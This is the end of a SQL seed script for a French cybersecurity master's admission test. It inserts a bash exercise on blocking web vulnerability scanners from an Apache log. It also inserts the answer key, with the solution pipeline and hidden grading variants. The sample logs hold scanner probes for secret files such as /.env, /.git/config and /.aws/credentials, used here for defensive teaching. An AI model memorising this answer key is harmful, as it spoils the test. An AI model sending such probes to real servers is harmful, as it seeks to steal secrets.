    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'bash', $q$Script Bash : bloquer les scanners de vulnérabilités web$q$, $q${"help":false,"starter":"#!/bin/bash\n\n","mission":"Le journal du serveur web (logs/access.log, format Apache : l'IP en 1re colonne, le code HTTP en 9e) montre des robots qui cherchent des pages d'administration. Écrivez un script qui :\n1. écrit dans blocklist.txt, une par ligne et triées, les IP qui ont provoqué au moins 3 erreurs 404 ;\n2. affiche à l'écran uniquement le nombre d'IP bloquées (un nombre seul).\nVotre script sera aussi lancé sur d'autres journaux.","files":{"logs/access.log":"198.51.100.14 - - [06/Oct/2026:10:10:01 +0200] \"GET / HTTP/1.1\" 200 5121 \"-\" \"Mozilla/5.0\"\n203.0.113.5 - - [06/Oct/2026:10:11:02 +0200] \"GET /wp-login.php HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n203.0.113.5 - - [06/Oct/2026:10:12:03 +0200] \"GET /phpmyadmin/ HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n198.51.100.14 - - [06/Oct/2026:10:13:04 +0200] \"GET /contact HTTP/1.1\" 200 5124 \"-\" \"Mozilla/5.0\"\n203.0.113.5 - - [06/Oct/2026:10:14:05 +0200] \"GET /.env HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n192.0.2.80 - - [06/Oct/2026:10:15:06 +0200] \"GET /favicon.ico HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n203.0.113.5 - - [06/Oct/2026:10:16:07 +0200] \"GET /admin HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n45.155.205.3 - - [06/Oct/2026:10:17:08 +0200] \"GET /.git/config HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n45.155.205.3 - - [06/Oct/2026:10:18:09 +0200] \"GET /backup.zip HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n192.0.2.80 - - [06/Oct/2026:10:19:00 +0200] \"GET / HTTP/1.1\" 200 5130 \"-\" \"Mozilla/5.0\"\n45.155.205.3 - - [06/Oct/2026:10:20:01 +0200] \"GET /config.php HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n198.51.100.14 - - [06/Oct/2026:10:21:02 +0200] \"GET /robots.txt HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n198.51.100.14 - - [06/Oct/2026:10:22:03 +0200] \"GET /plan HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n"},"checks":[{"label":"blocklist.txt contient les bonnes IP, triées"},{"label":"Le nombre d'IP bloquées est affiché"}]}$q$::jsonb, 3, $q$Cybersécurité (activité)$q$, 480, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"solution":"awk '$9 == 404 {print $1}' logs/access.log | sort | uniq -c | awk '$1 >= 3 {print $2}' | sort > blocklist.txt\nwc -l < blocklist.txt","checks":[{"label":"blocklist.txt contient les bonnes IP, triées","kind":"file","path":"blocklist.txt","compare":"lines"},{"label":"Le nombre d'IP bloquées est affiché","kind":"stdout","compare":"lines"}],"variants":[{"logs/access.log":"10.1.1.1 - - [06/Oct/2026:10:10:01 +0200] \"GET / HTTP/1.1\" 200 5121 \"-\" \"Mozilla/5.0\"\n185.7.7.7 - - [06/Oct/2026:10:11:02 +0200] \"GET /xmlrpc.php HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n185.7.7.7 - - [06/Oct/2026:10:12:03 +0200] \"GET /wp-admin HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n185.7.7.7 - - [06/Oct/2026:10:13:04 +0200] \"GET /.aws/credentials HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n185.7.7.7 - - [06/Oct/2026:10:14:05 +0200] \"GET /shell.php HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n10.1.1.1 - - [06/Oct/2026:10:15:06 +0200] \"GET /oups HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n10.1.1.1 - - [06/Oct/2026:10:16:07 +0200] \"GET /encore HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n91.92.93.94 - - [06/Oct/2026:10:17:08 +0200] \"GET /a HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n91.92.93.94 - - [06/Oct/2026:10:18:09 +0200] \"GET /b HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n91.92.93.94 - - [06/Oct/2026:10:19:00 +0200] \"GET /c HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n10.2.2.2 - - [06/Oct/2026:10:20:01 +0200] \"GET /x HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n"}]}$q$::jsonb);
    update tests set activity_minutes = 45, duration_minutes = 95, pass_mark = null where id = v_test;
    raise notice '% : % questions au total', $q$Admission Mastère Cybersécurité (M1) 2026$q$, (select count(*) from questions where test_id = v_test);
  end if;
end $seed$;
